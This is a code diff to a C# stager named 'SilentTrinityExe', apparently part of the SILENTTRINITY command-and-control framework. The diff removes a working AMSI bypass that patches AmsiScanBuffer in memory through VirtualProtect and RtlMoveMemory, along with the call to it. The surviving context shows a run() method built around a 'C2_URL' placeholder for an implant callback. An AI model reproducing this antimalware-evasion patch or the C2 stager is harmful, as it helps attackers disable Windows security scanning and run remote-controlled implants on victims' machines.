@@ -11,66 +11,6 @@ using System.Runtime.InteropServices;
 namespace SilentTrinityExe
 {
 
-
-    public class Amsi
-
-    {
-        [DllImport("kernel32.dll")]
-        static extern IntPtr LoadLibrary(string dllName);
-
-        [DllImport("kernel32.dll")]
-        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
-        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        internal static extern bool VirtualProtect(IntPtr address, uint size, uint newProtect, out IntPtr oldProtect);
-        public static string Run()
-        {
-            IntPtr dllHandle = LoadLibrary("amsi.dll"); //load the amsi.dll
-            if (dllHandle == null)
-            {
-                return "error";
-            }
-            else
-            {
-                Console.WriteLine("\n\n\n[*] Amsi.Dll Has Been Loaded");
-            }
-
-
-            //Get the AmsiScanBuffer function address
-            IntPtr AmsiScanbufferAddr = GetProcAddress(dllHandle, "AmsiScanBuffer");
-
-
-
-            IntPtr OldProtection = Marshal.AllocHGlobal(4); //pointer to store the current AmsiScanBuffer memory protection
-
-            //Pointer changing the AmsiScanBuffer memory protection from readable only to writeable (0x40)
-            bool VirtualProtectRc = VirtualProtect(AmsiScanbufferAddr, 0x0015, 0x40, out OldProtection);
-            if (VirtualProtectRc == false)
-            {
-                return "error";
-            }
-            else
-            {
-                Console.WriteLine("[*] Changing AmsiScanBuffer Memory protection to Writable : " + VirtualProtectRc);
-            }
-
-            //The new patch opcode
-            var patch = new byte[] { 0x31, 0xff, 0x90 };
-
-            //Setting a pointer to the patch opcode array (unmanagedPointer)
-            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
-            Marshal.Copy(patch, 0, unmanagedPointer, 3);
-
-            //Patching the relevant line (the line which submits the rd8 to the edi register) with the xor edi,edi opcode
-            MoveMemory(AmsiScanbufferAddr + 0x001b, unmanagedPointer, 3);
-            return "OK";
-        }
-
-
-    }
     class Program
     {
 
@@ -85,7 +25,7 @@ namespace SilentTrinityExe
             }
             public static void run()
             {
-                Amsi.Run();
+                
 
 
                 string url = "C2_URL";
